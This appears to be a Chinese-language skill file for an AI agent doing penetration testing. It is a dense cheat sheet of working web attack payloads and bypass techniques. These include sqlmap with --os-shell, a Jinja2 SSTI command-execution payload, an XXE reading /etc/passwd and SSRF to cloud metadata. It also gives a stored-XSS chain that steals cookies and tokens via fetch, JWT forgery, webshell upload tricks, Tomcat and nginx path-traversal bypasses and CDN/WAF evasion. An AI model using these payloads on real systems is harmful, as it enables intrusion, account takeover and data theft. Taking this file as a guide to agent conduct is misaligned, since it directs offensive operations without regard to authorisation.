---
name: web-attack-methods
description: >-
  Web全栈攻击:SQLi/命令注入/SSTI/XSS/SSRF/NoSQL,认证JWT/OAuth/SAML,LFI/上传,Tomcat/WS/STOMP/XFF/PATH_INFO/CDN502/网宿JS挑战绕过。Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [渗透测试, penetration-testing, 红队]
---

## Web 攻击手法（注入 / 认证 / 服务端 / 杂项 / CDN）

```
=== Web注入 ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | 手测 ' OR 1=1-- / ' AND SLEEP(5)--
  绕过 SEL/**/ECT,大小写,CHAR() | 升级 OUTFILE→webshell / xp_cmdshell / UDF
  布尔盲注必须成对对照：字符串型同一记录 `' AND 1=1--` vs `' AND 1=2--`；数字型同一记录 ` AND 1=1` vs ` AND 1=2`。
  只发 True 条件或拿不同记录（如 id=63 vs id=64）对照均不能证明注入。比较状态码、正文长度、关键字与重定向；无差分再换时间盲注/OOB。
命令注入: ; | && $(cmd) `cmd` %0a | 绕空格$IFS,绕cat用tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/属性/JS/href/DOM/SVG | 绕CSP用JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨Stored XSS via WebSocket/STOMP聊天: 客服系统(OCS/LiveChat)的agent面板常用innerHTML/v-html渲染visitor消息(Vue domProps innerHTML)
  攻击链: visitor STOMP连接→发含<img src=x onerror=fetch(...)>的消息→agent打开对话→XSS在agent浏览器执行→偷cookie/token/localStorage
  关键: agent浏览器通常能出网(不受后端air-gap限制)! payload目标: document.cookie + localStorage + fetch(admin API).then(exfil)
  绕过: mf:1(visitor身份)的消息, tp:0(文本类型)内容直接innerHTML; 图片消息用url字段(<img src>)不走innerHTML
SSRF: 绕IP 2130706433/[::1]/nip.io/#@ | 云元数据169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== 认证授权 ===
认证绕过: admin'-- | 密码重置(可预测token/Host头注入) | MFA绕过(跳过/爆破4-6位) | X-Forwarded-For轮换IP
IDOR: 换资源ID水平越权 | 批量赋值 {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a(alg none/RS256→HS256) | -C爆弱密钥 | kid注入 | jku/x5u远程密钥
401/403绕过: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri操纵(替换/后缀/@混淆/路径穿越) | state缺失→CSRF | PKCE降级 | id_token套JWT全攻击
SAML: XSW签名包装(SAML Raider) | 签名剥离 | 注释截断 admin<!---->@evil | Golden SAML(IdP私钥)

=== 服务端 ===
LFI: ../../../etc/passwd | php://filter读源码 | data:// expect:// phar:// | RCE链:日志投毒/会话投毒/phar反序列化
文件上传: 严格按 Store→Accept→Serve/Process 验证：先上传无害 txt/jpg，并从响应 URL、目录或 filepath/savepath 回显确认落地；再逐次只改变扩展名/MIME/内容之一；最后访问落地文件确认是解析执行而非静态下载。
  `Server.MapPath()`/路径错误通常说明 filepath/savepath 为空或非法，应先给确定目录并验证访问，禁止在未确认落地前反复猜路径。
  绕过：shell.php.jpg/.PHP/.php./%00 | .htaccess改解析 | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator路径穿越绕过认证拦截器: 拦截器匹配/api/*但actuator白名单→/actuator/../api/v1/endpoint绕过拦截器到达受保护端点
  原理: Spring Security/自定义拦截器对路径匹配在规范化前,Tomcat对路径规范化后路由→路径穿越绕过拦截器但到达目标Servlet
  验证: /actuator/health返回200(白名单)→/actuator/../target路径也返回200(绕过)vs直接/target返回403/sign is empty(被拦截) | /actuator/health/../../target(模板路径{*path}穿越)
  sign验证弱点: 很多自定义sign校验只检查header非空(sign:任意值+expTime:任意数字即通过)→发现code:500而非"sign is empty"=验证通过了 | 快检:sign:0或sign:aaa从"sign is empty"变500=只检非空
  升级: 绕过后结合X-HTTP-Method-Override: POST让GET请求触发POST处理器(某些Spring配置支持)

=== Web杂项 ===
🚨Tomcat ..;/ 绕过nginx路径限制: nginx不解析URL中的;(视为路径一部分)但Tomcat把..;/当路径穿越:
  /api/v1/v/..;/admin/path → nginx匹配/api/v1/v/(放行) → Tomcat解析为/admin/path(穿越!)
  验证: 正常/admin返回nginx 403, 用/api/v1/v/..;/admin返回Tomcat 404 = 绕过成功
  限制: Spring MVC DispatcherServlet路由独立于文件系统,只能访问同war内静态文件/非MVC路径
  组合: 配合Spring4Shell写入的JSP webshell, 或访问actuator端点
🚨WebSocket/STOMP帧绕过nginx方法限制: nginx对POST /api/v1/a/login返回405,但WebSocket升级后STOMP帧不受限:
  1. GET /api/v1/v/ws/{3位}/{8位随机}/websocket → 101 Upgrade (走visitor路径绕过)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → 直达Spring后端
  SockJS XHR替代: POST .../xhr_send发STOMP帧(204=成功), 不需真正WebSocket
  坑: CDN快速断开("Another connection still open"), 用raw socket比websocket库更稳
🚨X-Forwarded-For绕过应用层IP黑名单: CDN信任XFF头, 应用从XFF取客户端IP做黑名单检查:
  有效: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  无效: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  检测: 响应含 {code:10010, msg:"黑名单"} 且data字段是你的真实IP
🚨PATH_INFO nginx deny bypass: nginx deny .php文件(返回146B nginx 404)但PHP-FPM通过PATH_INFO仍可达:
  /denied/file.php → 404|146(nginx拦截) | /denied/file.php/ → 16B "File not found."(PHP-FPM执行!)
  /denied/file.php/x → 同上。PHP-FPM返回"File not found."说明请求穿透了nginx deny到了PHP-FPM(只是脚本路径不对)
  利用: 如果PHP配置cgi.fix_pathinfo=1(默认), /uploads/shell.jpg/x.php → PHP执行shell.jpg! | 确认存在后找FPM实际docroot(可能与nginx不同)
  识别: nginx deny返回固定大小(146B标准404), PHP-FPM返回16B "File not found." → 大小差异即突破信号
🚨响应大小指纹(隐藏文件发现): CMS catch-all路由返回固定大小首页(如44004B), nginx真实404返回146B
  文件存在但被deny: 返回146B(nginx 404) | 文件不存在: 返回catch-all大小(44004B) | → 146B=文件确实存在!
  方法: 批量扫描路径,按响应大小分类: catch-all=不存在, nginx404=存在但被禁, 其他大小=可访问
WAF绕过决策树: 编码→协议级→路径→变异→IP伪造→走私 | CORS: Origin反射+Credentials:true
🚨CDN 502绕过(URL模式过滤): CDN对admin路径返回502时,HTTP编码/走私/方法变换全无效→换协议:
  ①WebSocket升级: CDN通常只过滤HTTP响应,WS路径可能不在过滤规则中。/api/v1/a/ws/返回200而/api/v1/a/doLogin返回502=WS路径不受过滤
  ②找源站IP直连: DNS历史/证书透明/SNI扫描/同子网扫描/邮件头Return-Path/Shodan指纹匹配/CDN回源配置泄露/唯一错误页面指纹→绕过CDN直连后端
  ③非标端口: 扫CDN节点全端口,某些端口可能代理不同后端或过滤规则不同(如8085暴露actuator)
  ④路径穿越: /api/v1/v/..;/a/doLogin让Tomcat路由到admin但CDN可能不识别(注意:CDN仍可能过滤响应)
  ⑤泛解析识别: 所有子域名解析到CDN=通配符DNS,不是真实记录。用114.114.114.114/8.8.8.8对比结果
🚨WSCN/网宿CDN JS挑战识别与绕过: 响应含`_jsc_ch_conf`+`ws_sec_page.js`=网宿JS挑战(非WAF拦截)
  特征: cv:".域名",mt:"jhsq987",chType/chTs/chID/chHash字段 | 403页6000+字节含"Embed Iframe"
  绕过: CDN只对特定path白名单(如/c/)不做挑战→用Spring Boot ..;/ traversal(`/c/..;/target_path`)穿透到后端其他路由
  识别后端框架: JSON错误`{"timestamp":...,"status":...,"error":...,"path":...}`=Spring Boot | 405=路由存在但方法错

=== CDN绕过(目标藏在CDN后,admin接口被502) ===
CDN 502分析: 区分URL模式过滤(时序固定~0.3s,所有方法/编码/端口/节点都502)vs响应内容过滤vs后端挂了
  关键判断: 路径穿越(`/api/v1/v/..;/a/doLogin`)如果返回Tomcat 404=穿透CDN到后端,返回502=CDN URL模式拦截
  nginx 502 vs CDN PWS 502: nginx=边缘层反代挂了, PWS=CDN全局策略
```
